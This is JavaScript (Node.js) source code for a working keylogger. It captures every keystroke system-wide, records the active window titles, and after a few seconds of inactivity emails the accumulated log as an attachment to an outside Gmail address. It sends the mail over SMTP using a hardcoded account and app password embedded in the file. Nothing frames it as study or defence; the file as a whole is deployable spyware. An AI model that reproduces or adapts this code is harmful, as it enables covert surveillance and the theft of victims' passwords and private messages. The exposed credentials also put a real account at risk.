const nodemailer = require('nodemailer');
const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;
const fs = require('fs');
const activeWindow = require('active-win');
let previousWindowTitle = "";
let shiftDown = false; // Added to track shift key state
let ctrlDown = false; // Added to track left CTRL key state
let capsLock = false;
// Initialize an empty string to store the current output
let currentOutput = "";
let currentWindowTitle = "";
// Variable to track the inactivity timeout
let inactivityTimeout;

const shiftedCharacters = {
    '1': '!',
    '2': '@',
    '3': '#',
    '4': '$',
    '5': '%',
    '6': '^',
    '7': '&',
    '8': '*',
    '9': '(',
    '0': ')',
    'DOT' : '>',
    'COMMA' : '<',
    'MINUS' : '_',
    'FORWARD SLASH' : '?',
    'SQUARE BRACKET CLOSE' : '}',
    'SQUARE BRACKET OPEN' : '{',
    'SECTION' : '~',
    'QUOTE' : '"',
    'SEMICOLON' : ':',
    'BACK SLASH' : '|'
};

// Function to update the output
function updateOutput(keyName) {
    let enclosedKey;

    if (keyName === "RETURN") {
        enclosedKey = "<ENTER>";
    } else if (keyName === "LEFT SHIFT" || keyName === "RIGHT SHIFT") {
        enclosedKey = "<SHIFT>";
    } else if (keyName === "LEFT CTRL" || keyName === "RIGHT CTRL") {
        enclosedKey = "<CTRL>";
    } else if (keyName === "CAPS LOCK") {
      // Toggle Caps Lock state and indicate it in the log
        capsLock = !capsLock;
        enclosedKey = `<CAPS LOCK ${capsLock ? 'ON' : 'OFF'}>`;
    } else if (capsLock && keyName.match(/^[a-zA-Z]$/)) {
        // Convert letters to uppercase if Caps Lock is ON
        enclosedKey = keyName.toUpperCase();
    } else if (shiftDown && keyName.match(/^[a-zA-Z]$/)) {
        // Convert letters to uppercase if Caps Lock is ON
        enclosedKey = keyName.toUpperCase();
    } else if (shiftedCharacters[keyName]) {
        enclosedKey = `${shiftDown ? shiftedCharacters[keyName] : keyName}`;
    } else {
        enclosedKey = keyName.match(/^[a-zA-Z]$/) ? keyName.toLowerCase() : `<${keyName}>`;
    }

    currentOutput += enclosedKey + ""; // Add the key name and a space
    process.stdout.clearLine(); // Clear the current line
    process.stdout.cursorTo(0); // Move the cursor to the beginning of the line
    process.stdout.write(currentOutput.trim()); // Write the updated output without the trailing space

    // Reset the inactivity timeout on each key press
    clearTimeout(inactivityTimeout);

    inactivityTimeout = setTimeout(() => {
        sendLogsByEmail(currentOutput); // Send logs via email after 30 seconds of inactivity
        currentOutput = ""; // Reset the logs
    }, 10000); // 10 seconds in milliseconds
}

// Configure nodemailer with SMTP transport
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: 'itsmemaryfrance@gmail.com',
        pass: 'yaza grvn spnn pggh'
    }
});

// Function to send logs via email
function sendLogsByEmail(logs) {
    // Define the path and name of the text file where you want to save the logs.
    const logFilePath = 'keyboard_logs.txt';

    // Save the logs to the text file.
    fs.writeFile(logFilePath, logs, (error) => {
        if (error) {
            console.error('Error saving logs to a file:', error);
        } else {
            console.log('Logs saved to file:', logFilePath);
        }

        // Now, send the email with the logs attached as a file.
        const mailOptions = {
            from: 'itsmemaryfrance@gmail.com',
            to: 'deathsworn201@gmail.com',
            subject: 'Keyboard Logs',
            text: 'Please find the attached keyboard logs.',
            attachments: [
                {
                    filename: 'keyboard_logs.txt',
                    path: logFilePath,
                },
            ],
        };

        transporter.sendMail(mailOptions, function (error, info) {
            if (error) {
                console.error('Error sending email:', error);
            } else {
                console.log('Email sent:', info.response);
            }
        });
    });
}

const v = new GlobalKeyboardListener();
const keyState = {}; // Track the state of keys

// Add a listener to log every key press, but prevent double printing
v.addListener(function (e) {
    const keyName = e.name;
    if (!keyState[keyName]) {
        updateOutput(keyName); // Update the output

        keyState[keyName] = true;
    }
});

// Add a listener to reset the state when a key is released
v.addListener(function (e, down) {
    const keyName = e.name;
    if (!down[keyName]) {
        keyState[keyName] = false;
      if (e.name === "LEFT SHIFT" || e.name === "RIGHT SHIFT") {
        updateOutput("/SHIFT"); // Log shift release
        shiftDown = false; // Update shift state
      } else if (e.name === "LEFT CTRL" || e.name === "RIGHT CTRL"){
        updateOutput("/CTRL");
        ctrlDown = false;
      }
    }
});

v.addListener(function (e, down) {
    if (e.name === "LEFT SHIFT" || e.name === "RIGHT SHIFT") {
        shiftDown = down[e.name];
    } else if (e.name === "LEFT CTRL" || e.name === "RIGHT CTRL") {
        ctrlDown = down[e.name];
    }
});

// Function to update the active window information
async function updateActiveWindowInfo() {
    try {
        const windowInfo = await activeWindow();
        const newWindowTitle = windowInfo.title;
    
        if (newWindowTitle !== currentWindowTitle) {
            const output = `<Active Window: ${newWindowTitle}>\n`;
            // Log the new active application
            console.log(output);
    
        if (currentOutput) {
            currentOutput += "\n" + output;
        } else {
            currentOutput += output;
        }
        // Save the title of the previously active window
        currentWindowTitle = newWindowTitle;

        // Clear the entire console and write the updated output with active window info
        process.stdout.write('\x1Bc');
        process.stdout.write(currentOutput.trim());
            }}
    catch (error) {
        console.error('Error while monitoring the active window: ', error);
    }
    }

// Add a timer to periodically update the active window info
setInterval(updateActiveWindowInfo, 1000); // Update every 1 second